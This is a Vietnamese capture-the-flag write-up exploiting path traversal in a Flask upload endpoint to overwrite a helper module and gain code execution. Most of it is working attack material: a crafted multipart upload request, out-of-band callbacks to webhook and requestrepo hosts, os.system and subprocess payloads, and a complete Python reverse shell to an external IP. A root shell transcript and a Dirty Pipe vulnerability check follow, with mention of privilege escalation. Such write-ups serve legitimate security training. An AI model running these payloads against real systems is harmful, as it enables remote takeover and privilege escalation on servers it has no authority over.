### Cái nhìn đầu tiên về challenge
Service cho phép người dùng upload file thông qua `/uploader` với phương thức POST.

Phân tích source code:

- `UPLOAD_FOLDER` là biến chứa giá trị của thư mục `uploads`, nơi chứa các file mà user upload.
- tại enpoint `/uploader`, service kiểm tra tên của file xem có chứa `main` hay không, nếu có trả về lỗi. Điều này cho ta gợi ý về việc upload file main.py, hoặc một file nào khác nếu có để có thể ghi đè lên file đã tồn tại.
- cũng tại enpoint này, có một lỗ hổng rõ ràng của path traversal:
```py
file_path = os.path.join(UPLOAD_FOLDER, f.filename)
```
tại vì `f.filename` không được validate, lỗ hổng này cho ta chỉ định vị trí mà file upload tùy ý. Để khai thác điều này, ta có thể upload file sau đó kiến file này được thực thi. Ví dụ như cấy ssh key vào server, tạo cron job, hoặc một file nào đó được service gọi mỗi khi hoạt động.
- Tiếp theo, ta nhận thấy rằng service gọi hàm `rename_file` của helper.py mỗi khi user upload file. Đến đây, ta có thể kết luận rằng intended solution của challenge này là upload file ghi đè lên helper.py của server, sau đó thực hiện khai thác bằng script python mà ta upload.
- Bên cạnh đó, có một luồng để chạy hàm `restore_helper` song song với Flask, nhưng ta không thấy hàm này ở trong source code. Có thể hàm đã bị tác giả xóa do hàm này sẽ đưa gợi ý về cách khai thác. Như vậy, càng làm rõ hơn về hướng giải quyết bài toán: upload file hepler.py, sau một thời gian, hàm restore sẽ chạy để đưa service hoạt động lại bình thường.

### Quá trình thực hiện khai thác cơ bản

Để khai thác lỗ hổng trên, đầu tiên ta có thể tìm cách thực hiện oob với python. Một số cách cơ bản như sau: 
- DNS Tunneling
- sử dụng các thư viện như requests, http.client, aiohttp, httpx
- sử dụng thư viện tiêu chuẩn urllib.request

Ta cũng nên tìm các khai thác sâu hơn với các cách thực thi các câu lệnh os bằng python
- sử dụng os.system()
- subprocess.run(), subprocess.Popen()
- một số thư viện khác như sh, plumbum


```http
POST /uploader HTTP/1.1
Host: 113.171.248.61:8008
Content-Length: 320
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTuqwF0trCu55CLlW
Cookie: PHPSESSID=2el5uhrnhfo974d5ugelqkvenp; session=eyJudW1fZmlsZSI6NX0.aCMihw.s5dJTCjQe6G5eb8NF1V4LZHfJoQ
Connection: keep-alive

------WebKitFormBoundaryTuqwF0trCu55CLlW
Content-Disposition: form-data; name="files"; filename="../utils/helper.py"
Content-Type: text/x-python


import requests

def rename_file(a, b):
    requests.get("https://webhook.site/d5b9fc03-371d-49f8-a78f-5100625091fe")


------WebKitFormBoundaryTuqwF0trCu55CLlW--
```
```
Lỗi xử lý file: No module named 'requests'
```
Qua nhiều lần thử nghiệm tương tự, một số thư viện như http.client và urllib.request đã thành công thực hiện request.

Bên cạnh đó, ta còn có thể thực hiện RCE như sau:
```
import os

def rename_file(a, b):
    os.system("nslookup uw7gblig.requestrepo.com")
```
hoặc
```
import subprocess

def rename_file(a, b):
    subprocess.run(["nslookup", "uw7gblig.requestrepo.com"])
```

Đến đây, ta có rất nhiều cách để thực hiện một reverse shell, một ví dụ trong https://www.revshells.com:
```
import socket,subprocess,os

def rename_file(a, b):
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("160.19.78.160",4444))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/sh","-i"])
```
Như vậy, ta đã có một shell trên server của mình.
```console
root@isp:~# nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 113.171.248.61 53498
/bin/sh: can't access tty; job control turned off
/app #  * Detected change in '/app/utils/helper.py', reloading
/app/uploads/../utils/helper.py
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

### Sau khi RCE
Kiểm chứng file main.py (real_main.py) thật sự trên server, ta thấy được có tồn tại func `restore_helper` và một folder backup.

Thấy rằng, ta đang ở bên trong một container Docker chứ không phải hệ thống host: `ps aux` có rất ít tiến trình, hostname ngẫu nhiên, và có file `.dockerenv`
```
/ # ls -la
total 88
drwxr-xr-x    1 root     root          4096 May  8 09:39 .
drwxr-xr-x    1 root     root          4096 May  8 09:39 ..
-rwxr-xr-x    1 root     root             0 May  8 04:04 .dockerenv
.
.
.
```

```
/app # cat /etc/os-release
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.21.3
PRETTY_NAME="Alpine Linux v3.21"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
/app # uname -a
Linux fda09c35d770 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024 x86_64 Linux
```
Có thể thấy rằng ta đang trong một container chạy Alpine Linux v3.21, host là Ubuntu kernel 5.15.0.

Như vậy, có khả năng máy chủ dính [CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits). Ta có thể kiểm chứng điều này nhờ tool checker: [CVE-2022-0847-dirty-pipe-checker](https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker).

Kết quả trả về, máy chủ vulnerable với CVE này
```shell
/app/CVE-2022-0847-dirty-pipe-checker 
# ./dpipe.sh
5 15 0
Vulnerable
```
Như vậy, nếu một user có quyền truy cập vào server mà không có quyền root, ta có thể tiếp tục với exploit Dirty Pipe để ghi đè `/etc/passwd` hoặc tạo SUID shell
